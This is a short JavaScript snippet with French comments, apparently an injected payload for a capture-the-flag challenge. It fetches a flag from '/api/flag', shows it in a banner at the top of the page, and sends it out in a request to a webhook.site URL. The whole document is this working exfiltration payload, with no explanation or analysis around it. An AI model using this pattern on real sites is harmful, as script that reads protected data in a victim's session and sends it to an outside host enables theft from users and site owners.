// Récupérer le flag
fetch('/api/flag')
  .then(response => response.text())
  .then(flag => {
    // Créer un élément pour afficher le flag dans la page
    const flagElement = document.createElement('div');
    flagElement.style.position = 'fixed';
    flagElement.style.top = '0';
    flagElement.style.left = '0';
    flagElement.style.width = '100%';
    flagElement.style.backgroundColor = 'red';
    flagElement.style.color = 'white';
    flagElement.style.padding = '20px';
    flagElement.style.zIndex = '9999';
    flagElement.textContent = 'FLAG: ' + flag;
    document.body.appendChild(flagElement);
    
    // Envoyer aussi le flag à un webhook pour le récupérer
    const webhookUrl = 'https://webhook.site/d7728677-d8a7-4410-bc60-0f6320a74a1e/'; // Ajoutez votre ID unique webhook.site ici
    fetch(webhookUrl + '?flag=' + encodeURIComponent(flag));
  })
  .catch(error => {
    console.error('Erreur:', error);
  });
